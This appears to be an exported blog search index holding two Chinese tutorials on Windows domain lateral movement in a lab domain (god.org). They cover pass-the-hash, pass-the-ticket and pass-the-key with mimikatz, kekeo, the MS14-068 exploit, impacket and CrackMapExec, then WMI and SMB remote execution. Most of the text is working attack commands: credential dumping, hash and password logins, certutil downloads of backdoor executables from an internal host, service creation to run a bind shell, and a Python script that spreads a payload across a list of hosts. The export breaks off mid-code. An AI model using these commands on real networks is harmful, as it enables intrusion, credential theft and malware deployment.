<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>内网横向移动(三)PTH&amp;PTT&amp;PTK</title>
      <link href="/posts/b0cb9aff/"/>
      <url>/posts/b0cb9aff/</url>
      
        <content type="html"><![CDATA[<h1 id="内网横向移动-三-PTH-amp-PTT-amp-PTK"><a href="#内网横向移动-三-PTH-amp-PTT-amp-PTK" class="headerlink" title="内网横向移动(三)PTH&amp;PTT&amp;PTK"></a>内网横向移动(三)PTH&amp;PTT&amp;PTK</h1><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><p><img src="/posts/b0cb9aff/1664590631667-13a73e03-1b19-4318-9d84-be23d45b95b1.png" alt="bfl2kYExirJ2o8jENtd6_g.png"><br><img src="/posts/b0cb9aff/1664590640844-ae091338-93fe-4eaf-8cbe-5fcf543e2f61.png" alt="image-20221001092803141.png"><br>已经拿下webserver并且已提权<br>信息搜集已完成<br><img src="/posts/b0cb9aff/1664590644692-a7aff714-0d37-4cad-b0a6-a37cc6229d2f.png" alt="image-20221001101059993.png"><br><img src="/posts/b0cb9aff/1664590650240-4dc5af18-52c7-46af-92cc-1bb8d6a14a33.png" alt="image-20221001101117535.png"></p><h2 id="简单了解PTH-amp-PTK-amp-PTT"><a href="#简单了解PTH-amp-PTK-amp-PTT" class="headerlink" title="简单了解PTH&amp;PTK&amp;PTT"></a>简单了解PTH&amp;PTK&amp;PTT</h2><p>pass the hash（哈希传递攻击，简称PTH）利用的lm或ntlm的值进行的渗透测试（NTLM认证攻击）<br>pass the ticket（票据传递攻击，简称PTK）  利用的ekeys aes256进行的渗透测试（NTLM认证攻击）<br>pass the key（密钥传递攻击，简称PTT） 利用的票据凭证TGT进行渗透测试（Kerberos认证攻击）</p><h2 id="PTH-Mimikatz-amp-NTLM"><a href="#PTH-Mimikatz-amp-NTLM" class="headerlink" title="PTH-Mimikatz&amp;NTLM"></a>PTH-Mimikatz&amp;NTLM</h2><p>PTH &#x3D; Pass The Hash，通过密码散列值 (通常是NTLM Hash)来进行攻击。<br>在域环境中，用户登录计算机时使用的域账号，计算机会用相同本地管理员账号和密码。<br>因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就可以使用哈希传递的方法登录到内网主机的其他计算机。另外注意在Window Server 2012 R2之前使用到的密码散列值是LM Hash，在2012 R2及其版本之后使用到的密码散列值是NTLM Hash。也就是如果对Window Server 2012 R2之前的版本进行渗透需要使用的是LM Hash<br><img src="/posts/b0cb9aff/1664590660969-02a98b3d-dceb-43d6-80aa-f0ed9812771b.png" alt="image-20221001095803479.png"></p><h3 id="1、Mimikatz"><a href="#1、Mimikatz" class="headerlink" title="1、Mimikatz"></a>1、Mimikatz</h3><p>利用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz privilege::debug</span><br><span class="line">mimikatz sekurlsa::pth /user:administrator /domain:192.168.3.32 /ntlm:518b98ad4178a53695dc997aa02d455c</span><br></pre></td></tr></table></figure><p>执行完成后在主机弹出一个cmd窗口<br><img src="/posts/b0cb9aff/1664590669515-9b811fa9-c480-4a09-9ecb-7e9168ae96f1.png" alt="image-20221001101248997.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.32\c$</span><br><span class="line">dir \\192.168.3.32\c$</span><br></pre></td></tr></table></figure><p><img src="/posts/b0cb9aff/1664590678773-60b7d7c0-d02f-4579-b68e-6b330e90e49d.png" alt="image-20221001101418441.png"><br>利用转发上线,把后门上传到webserver然后利用以下命令上传到目标然后执行上线</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy C:\Users\webadmin\Desktop\zf.exe \\192.168.3.32\c$</span><br><span class="line">sc \\sqlserver create bshell binpath= &quot;c:\zf.exe&quot; #sqlserver是192.168.3.32的主机名字可换为ip地址</span><br><span class="line">sc \\sqlserver start bshell </span><br></pre></td></tr></table></figure><p><img src="/posts/b0cb9aff/1664591628278-cd66e3fa-cf04-4ea0-a4c2-805ae255afed.png" alt="image.png"><br>成功上线</p><h3 id="2、impacket-at-amp-ps-amp-wmi-amp-smb"><a href="#2、impacket-at-amp-ps-amp-wmi-amp-smb" class="headerlink" title="2、impacket-at&amp;ps&amp;wmi&amp;smb"></a>2、impacket-at&amp;ps&amp;wmi&amp;smb</h3><p>CS利用webserver开启socks代理然后用Proxifier连接代理<br><img src="/posts/b0cb9aff/1664591828118-6532749c-ebc9-4121-a874-fc1caf1a670a.png" alt="image.png"><br>以下工具均在impacket套件中，根据协议开放三选一即可<br>exe版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">psexec</span></span><br><span class="line">psexec -hashes :NTLM值 域名/域用户@域内ip地址</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">smbexec</span></span><br><span class="line">smbexec -hashes :NTLM值 域名/域用户@域内ip地址</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">wmiexec</span></span><br><span class="line">wmiexec -hashes :NTLM值 域名/域用户@域内ip地址</span><br></pre></td></tr></table></figure><p>python版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">psexec</span></span><br><span class="line">python psexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">smbexec</span></span><br><span class="line">python smbexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">wmiexec</span></span><br><span class="line">python wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br></pre></td></tr></table></figure><p>执行结束后会返回一个cmd会话<br><img src="/posts/b0cb9aff/1664592072918-4bf51e93-a00b-401e-a79b-498f29d12573.png" alt="image.png"><br><img src="/posts/b0cb9aff/1664592131849-b560c575-38e6-4470-9385-b33cbdc6455c.png" alt="image.png"><br>后续上线方法:将后门上传到webserver的web目录，然后利用cmd会话下载后门然后执行(具体操作见前篇)<br>三个工具都是返回cmd会话，操作相同</p><h2 id="PTK-Mimikatz-amp-AES256"><a href="#PTK-Mimikatz-amp-AES256" class="headerlink" title="PTK-Mimikatz&amp;AES256"></a>PTK-Mimikatz&amp;AES256</h2><p>PTK &#x3D; Pass The Key，当系统安装了KB2871997补丁且禁用了NTLM的时候，<br>那我们抓取到的ntlm hash也就失去了作用，但是可以通过PTK的攻击方式获得权限。<br>利用方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::ekeys</span><br><span class="line">mimikatz sekurlsa::pth /user:域用户名 /domain:域名 /aes256:aes256值</span><br></pre></td></tr></table></figure><p>由于环境不允许无法复现</p><h2 id="PTT-漏洞-amp-Kekeo-amp-Ticket"><a href="#PTT-漏洞-amp-Kekeo-amp-Ticket" class="headerlink" title="PTT-漏洞&amp;Kekeo&amp;Ticket"></a>PTT-漏洞&amp;Kekeo&amp;Ticket</h2><p><a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a><br><a href="https://github.com/gentilkiwi/kekeo/releases">https://github.com/gentilkiwi/kekeo/releases</a></p><h3 id="1、MS14068-webadmin权限"><a href="#1、MS14068-webadmin权限" class="headerlink" title="1、MS14068(webadmin权限)"></a>1、MS14068(webadmin权限)</h3><blockquote><p><strong>利用漏洞生成的用户的新身份票据尝试认证</strong></p></blockquote><p>MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。<br>它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC。<br>该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。<br>用户可以通过呈现具有改变的PAC的Kerberos TGT来获得票证.<br>简单来说就是伪造用户身份,类似cookie伪造，只要是域内用户就可以<br>获取SID值：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell whoami/user</span><br></pre></td></tr></table></figure><p><img src="/posts/b0cb9aff/1664593480957-4f7a00af-b16e-4384-bb62-6bf1e308abe6.png" alt="image.png"><br>生成票据文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell ms14-068.exe -u webadmin@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1132 -d 192.168.3.21 -p admin!@#45</span><br></pre></td></tr></table></figure><p><img src="/posts/b0cb9aff/1664593623202-c6794fdb-7a58-4a85-b477-80922a2847cb.png" alt="image.png"><br><img src="/posts/b0cb9aff/1664593642112-4a75aa17-5cea-43c3-b72e-83485cc2c4e6.png" alt="image.png"><br>清除票据连接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell klist purge</span><br></pre></td></tr></table></figure><p><img src="/posts/b0cb9aff/1664593684804-6dbc7024-f97c-40bb-a1d0-2d3be9a9948d.png" alt="image.png"><br>把生成的票据文件上传到webserver<br><img src="/posts/b0cb9aff/1664593747716-ad567511-895c-48de-9281-f1732dcfd13c.png" alt="image.png"><br>内存导入票据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptc TGT_webadmin@god.org.ccache</span><br></pre></td></tr></table></figure><p><img src="/posts/b0cb9aff/1664593800849-b3f3ead2-e294-4695-baa8-afac6eb5579e.png" alt="image.png"><br><img src="/posts/b0cb9aff/1664593818520-b1f29128-73e2-42f0-b6f6-65bcf9ae9296.png" alt="image.png"><br>注意这里的开始和结束时间，只有在这个时间端内票据才是有效的<br>测试连接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注意这里要使用计算机名 使用ip地址可能出错</span></span><br><span class="line">shell dir \\OWA2010CN-GOD\c$</span><br><span class="line">shell net use \\OWA2010CN-GOD\C$</span><br></pre></td></tr></table></figure><p><img src="/posts/b0cb9aff/1664594028087-6c0079b6-a49e-4518-9d2b-5f896c5656bb.png" alt="image.png"><br>上线</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell copy C:\Users\webadmin\Desktop\zf.exe \\OWA2010CN-GOD\C$</span><br><span class="line">shell sc \\OWA2010CN-GOD create bindshell binpath= &quot;c:\zf.exe&quot;</span><br><span class="line">shell sc \\OWA2010CN-GOD start bindshell</span><br></pre></td></tr></table></figure><p><img src="/posts/b0cb9aff/1664594110665-248b64a7-cf44-4236-b764-612599dc5270.png" alt="image.png"><br><img src="/posts/b0cb9aff/1664594118134-e7d259b7-db2f-4d23-a66b-8c34125b2e46.png" alt="image.png"><br>注意：成功不成功看DC域控漏洞补丁打没打</p><h3 id="2、kekeo-高权限，需NTLM"><a href="#2、kekeo-高权限，需NTLM" class="headerlink" title="2、kekeo(高权限，需NTLM)"></a>2、kekeo(高权限，需NTLM)</h3><blockquote><p><strong>利用获取的NTLM生成新的票据尝试认证</strong></p></blockquote><p>利用我们获取到NTLM重新生成一个票据然后再去连接<br>缺点：票据是有有效期的，所以如果当前主机在连接过域控的话，有效期内可利用。<br>先把kekeo.exe上传到webserver<br>生成票据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">注意这里是利用域控的<span class="built_in">hash</span> 如果用普通成员的<span class="built_in">hash</span>无法成功 可以通过横向移动到其他主机拿到</span></span><br><span class="line">shell kekeo &quot;tgt::ask /user:Administrator /domain:god.org /ntlm:ccef208c6485269c20db2cad21734fe7&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p>导入票据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell kekeo &quot;kerberos::ptt TGT_Administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p>查看票据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell klist</span><br></pre></td></tr></table></figure><p>利用票据连接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\owa2010cn-god\c$</span><br></pre></td></tr></table></figure><p><img src="/posts/b0cb9aff/1664600117220-4bb77a02-9509-4348-ab28-faabcb1298ea.png" alt="image.png"><br>注意：成功不成功看ntlm哈希值的正确性<br><strong>到这里可能会有疑问有了hash值为什么不用pth攻击呢?</strong><br>注意pth的利用前提是smb和wmi等协议是正常的,那么这些不正常的时候我们就可以利用ptt攻击来达到目的<br>一个是NTLM认证,一个是Kerberos认证</p><h3 id="3、mimikatz-高权限-需Ticket"><a href="#3、mimikatz-高权限-需Ticket" class="headerlink" title="3、mimikatz(高权限,需Ticket)"></a>3、mimikatz(高权限,需Ticket)</h3><blockquote><p><strong>利用历史遗留的票据重新认证尝试</strong></p></blockquote><p>域控与主机建立连接后生成的票据有效时间为10个小时，在这10个小时中拿到票据那么就可以利用mimikatz将票据导出然后再导入进行伪造。<br>导出票据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::tickets /export</span><br></pre></td></tr></table></figure><p>导入票据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这里要选择管理员登录电脑后生成的票据</span></span><br><span class="line">mimikatz kerberos::ptt C:\Users\webadmin\Desktop\[0;687080]-2-0-40e00000-Administrator@krbtgt-god.org.kirbi</span><br></pre></td></tr></table></figure><p>查看票据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell klist</span><br></pre></td></tr></table></figure><p>利用票据连接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\owa2010cn-god\c$</span><br></pre></td></tr></table></figure><p>注意：成功不成功看当前主机有没有被目标连接过<br><img src="/posts/b0cb9aff/1664608850615-84121039-14c8-4e88-af9c-eca4ef59414d.png" alt="image.png"></p><h2 id="PTH-Proxychains-amp-CrackMapExec"><a href="#PTH-Proxychains-amp-CrackMapExec" class="headerlink" title="PTH-Proxychains&amp;CrackMapExec"></a>PTH-Proxychains&amp;CrackMapExec</h2><p>CrackMapExec<br>Github：<a href="https://github.com/Porchetta-Industries/CrackMapExec">https://github.com/Porchetta-Industries/CrackMapExec</a><br>官方手册：<a href="https://mpgn.gitbook.io/crackmapexec/">https://mpgn.gitbook.io/crackmapexec/</a><br>部分案例：<a href="https://www.freebuf.com/sectool/184573.html">https://www.freebuf.com/sectool/184573.html</a><br>下载对应release，建立socks连接，设置socks代理，配置规则，调用！<br>详细配置可看上篇<br>1、Linux Proxychains使用<br>代理配置：Proxychains.conf<br>代理调用：Proxychains 命令<br>2、密码喷射-域用户登录PTH：<br>利用CrackMapExec对hash值进行验证</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">域用户HASH登录</span></span><br><span class="line">proxychains python cme smb 192.168.3.21-32 -u user.txt -H 518b98ad4178a53695dc997aa02d455c </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">本地用户HASH登录</span></span><br><span class="line">proxychains python cme smb 192.168.3.21-32 -u administrator -H 518b98ad4178a53695dc997aa02d455c --local-auth</span><br></pre></td></tr></table></figure><p><img src="/posts/b0cb9aff/1664610207506-ad93ffcb-4e92-40d9-9dc8-a72b638a9dac.png" alt="image.png"><br><img src="/posts/b0cb9aff/1664609993691-b465b616-0829-4bac-933a-0cc1a5a57884.png" alt="image.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>PTH在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。<br>如果禁用了ntlm认证，PsExec无法利用获得的ntlm hash进行远程连接，但是使用mimikatz还是可以攻击成功。对于8.1&#x2F;2012r2，安装补丁kb2871997的Win 7&#x2F;2008r2&#x2F;8&#x2F;2012等，可以使用AES keys代替NT hash来实现ptk攻击,<br>打了KB2871997补丁后的影响</p><ul><li>pth：没打补丁用户都可以连接，打了补丁只能administrator连接</li><li>ptk：打了补丁才能用户都可以连接，采用aes256连接</li><li><a href="https://www.freebuf.com/column/220740.html">https://www.freebuf.com/column/220740.html</a></li></ul><p>PTT攻击的部分就不是简单的NTLM认证了，它是利用Kerberos协议进行攻击的，三种常见的攻击方法：MS14-068，Golden ticket，SILVER ticket，简单来说就是将连接合法的票据注入到内存中实现连接。<br>MS14-068基于漏洞，Golden ticket(黄金票据)，SILVER ticket(白银票据)<br>其中Golden ticket(黄金票据)，SILVER ticket(白银票据)属于权限维持技术<br>MS14-068造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是kb3011780。</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网横向移动(二)WMI&amp;SMB</title>
      <link href="/posts/82f7f61b/"/>
      <url>/posts/82f7f61b/</url>
      
        <content type="html"><![CDATA[<h1 id="内网横向移动-二-WMI-amp-SMBWMI-amp-SMB"><a href="#内网横向移动-二-WMI-amp-SMBWMI-amp-SMB" class="headerlink" title="内网横向移动(二)WMI&amp;SMBWMI&amp;SMB"></a>内网横向移动(二)WMI&amp;SMBWMI&amp;SMB</h1><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><p><img src="/posts/82f7f61b/bfl2kYExirJ2o8jENtd6_g.png" alt="img"><br><img src="/posts/82f7f61b/image-20220929085713847.png" alt="image-20220929085713847"><br>和上篇环境相同已经拿到webserver权限并且提权</p><h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><p>方法和上篇相同<br><img src="/posts/82f7f61b/image-20220929090156725.png" alt="image-20220929090156725"><br><img src="/posts/82f7f61b/image-20220929090206296.png" alt="image-20220929090206296"></p><h2 id="域横向移动"><a href="#域横向移动" class="headerlink" title="域横向移动"></a>域横向移动</h2><p>先将木马上传到webserver的web目录(具体操作见上篇)<br><img src="/posts/82f7f61b/image-20220929092116112.png" alt="image-20220929092116112"></p><h3 id="WMI-自带-amp-命令-amp-套件-amp-插件"><a href="#WMI-自带-amp-命令-amp-套件-amp-插件" class="headerlink" title="WMI-自带&amp;命令&amp;套件&amp;插件"></a>WMI-自带&amp;命令&amp;套件&amp;插件</h3><p>WMI是通过135端口进行利用，支持用户名明文的方式进行认证，并且该方法不会在目标日志系统留下痕迹。</p><h4 id="1-wmic"><a href="#1-wmic" class="headerlink" title="1.wmic"></a>1.wmic</h4><p>内部：(单执行)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.3.32 /user:administrator /password:Admin12345 process call create &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/zf.exe c:/test.exe&quot;</span><br><span class="line">wmic /node:192.168.3.32 /user:administrator /password:admin!@#45 process call create &quot;cmd.exe c:/beacon.exe&quot;</span><br></pre></td></tr></table></figure><p>执行结束后并没有回显<br><img src="/posts/82f7f61b/image-20220929092535171.png" alt="image-20220929092535171"><br>但是确实已经执行成功<br><img src="/posts/82f7f61b/image-20220929092558693.png" alt="image-20220929092558693"></p><h4 id="2-cscript"><a href="#2-cscript" class="headerlink" title="2.cscript"></a>2.cscript</h4><p>内置：(交互式)</p><p>上传wmiexec.vbs(用webserver的web环境)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345</span><br></pre></td></tr></table></figure><p>可以反弹shell但是在cs中不能操作 需要在本机shell环境执行<br><img src="/posts/82f7f61b/image-20220929093356049.png" alt="image-20220929093356049"></p><h4 id="3-wmiexec-impacket"><a href="#3-wmiexec-impacket" class="headerlink" title="3.wmiexec-impacket"></a>3.wmiexec-impacket</h4><p>wmiexec为impacket套件中的工具<br>cs建立SOCKS代理 本机通过proxifier和内网环境进行通讯<br>执行命令:</p><p>外部：(交互式&amp;单执行)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#明文</span><br><span class="line">python wmiexec.py ./administrator:admin!@#45@192.168.3.32 &quot;whoami&quot;</span><br><span class="line">#hash</span><br><span class="line">python wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 &quot;whoami&quot;</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929094339457.png" alt="image-20220929094339457"><br><img src="/posts/82f7f61b/image-20220929095344270.png" alt="image-20220929095344270"></p><p>下载后门：实际情况中要对账号(本地和域)和密码进行尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py ./administrator:admin!@#45@192.168.3.32 &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/zf.exe c:/mm.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929094721757.png" alt="image-20220929094721757"></p><p>执行后门：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py ./administrator:admin!@#45@192.168.3.32 &quot;cmd.exe /c c:/mm.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929094834259.png" alt="image-20220929094834259"><br>继续抓取hash和明文密码,进行横向移动</p><h3 id="SMB-自带-amp-命令-amp-套件-amp-插件"><a href="#SMB-自带-amp-命令-amp-套件-amp-插件" class="headerlink" title="SMB-自带&amp;命令&amp;套件&amp;插件"></a>SMB-自带&amp;命令&amp;套件&amp;插件</h3><p>利用SMB服务可以通过明文或hash传递来远程执行，条件445服务端口开放。</p><h4 id="1-psexec"><a href="#1-psexec" class="headerlink" title="1.psexec"></a>1.psexec</h4><p><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p><p>内部：(交互式 windows官方工具) 依旧是返回一个shell需要在本机shell环境执行还需要管理员权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec64 \\192.168.3.32 -u administrator -p admin!@#45 -s cmd</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929100826849.png" alt="image-20220929100826849"></p><p>外部：(交互式 外人开发的工具)<br>impacket套件windows版中工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929101711951.png" alt="image-20220929101711951"></p><p>插件：<br>cs插件-psexec<br><img src="/posts/82f7f61b/image-20220929101836985.png" alt="image-20220929101836985"><br><img src="/posts/82f7f61b/image-20220929102108420.png" alt="image-20220929102108420"><br><img src="/posts/82f7f61b/image-20220929102122142.png" alt="image-20220929102122142"><br>sqlserver再次上线</p><h4 id="2-smbexec-impacket"><a href="#2-smbexec-impacket" class="headerlink" title="2.smbexec-impacket"></a>2.smbexec-impacket</h4><p>外部：(交互式) .&#x2F;username为本地用户 god.&#x2F;username 为域用户 在实战中都要尝试(有可能域和本地密码相同，或内网本地密码统一)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smbexec ./administrator:admin!@#45@192.168.3.32</span><br><span class="line">smbexec god/administrator:admin!@#45@192.168.3.32</span><br><span class="line">smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br><span class="line">smbexec -hashes :518b98ad4178a53695dc997aa02d455c god/administrator@192.168.3.32</span><br><span class="line">smbexec -hashes god/administrator:518b98ad4178a53695dc997aa02d455c@192.168.3.32</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929102928994.png" alt="image-20220929102928994"></p><h4 id="3-services"><a href="#3-services" class="headerlink" title="3.services"></a>3.services</h4><p>内置：(单执行) –无回显</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">services -hashes :518b98ad4178a53695dc997aa02d455c ./administrator:@192.168.3.32 create -name shell -display shellexec -path C:\Windows\System32\shell.exe</span><br><span class="line">services -hashes :518b98ad4178a53695dc997aa02d455c ./administrator:@192.168.3.32 start -name shell</span><br></pre></td></tr></table></figure><h3 id="工具-Proxychains-amp-CrackMapExec"><a href="#工具-Proxychains-amp-CrackMapExec" class="headerlink" title="工具-Proxychains&amp;CrackMapExec"></a>工具-Proxychains&amp;CrackMapExec</h3><h4 id="1、Windows-Proxifier-Python-exp"><a href="#1、Windows-Proxifier-Python-exp" class="headerlink" title="1、Windows+Proxifier+Python_exp"></a>1、Windows+Proxifier+Python_exp</h4><p>和上篇脚本类似</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">ips=[<span class="string">&#x27;192.168.3.21&#x27;</span>,<span class="string">&#x27;192.168.3.25&#x27;</span>,<span class="string">&#x27;192.168.3.29&#x27;</span>,<span class="string">&#x27;192.168.3.28&#x27;</span>,<span class="string">&#x27;192.168.3.30&#x27;</span>,<span class="string">&#x27;192.168.3.32&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">down</span>():</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        wmi_exec=<span class="string">&#x27;D:\Myproject\\venv\Scripts\python.exe D:\Myproject\impacket-master\examples\\wmiexec.py ./administrator:admin!@#45@%s &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/4455.exe c:/4455.exe&quot;&#x27;</span>%ip</span><br><span class="line">        <span class="built_in">print</span>(wmi_exec)</span><br><span class="line">        os.system(wmi_exec)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zx</span>():</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        wmi_exec=<span class="string">&#x27;D:\Myproject\\venv\Scripts\python.exe D:\Myproject\impacket-master\examples\\wmiexec.py ./administrator:admin!@#45@%s &quot;c:/4455.exe&quot;&#x27;</span>%ip</span><br><span class="line">        <span class="built_in">print</span>(wmi_exec)</span><br><span class="line">        os.system(wmi_exec)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    down()</span><br><span class="line">    zx()</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929105529414.png" alt="image-20220929105529414"><br><img src="/posts/82f7f61b/image-20220929105548450.png" alt="image-20220929105548450"><br>3.29和3.32下载成功<br><img src="/posts/82f7f61b/image-20220929110153239.png" alt="image-20220929110153239"><br>上线 抓取hash和明文密码<br><img src="/posts/82f7f61b/image-20220929110315051.png" alt="image-20220929110315051"><br>修改脚本改为hash传递</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span 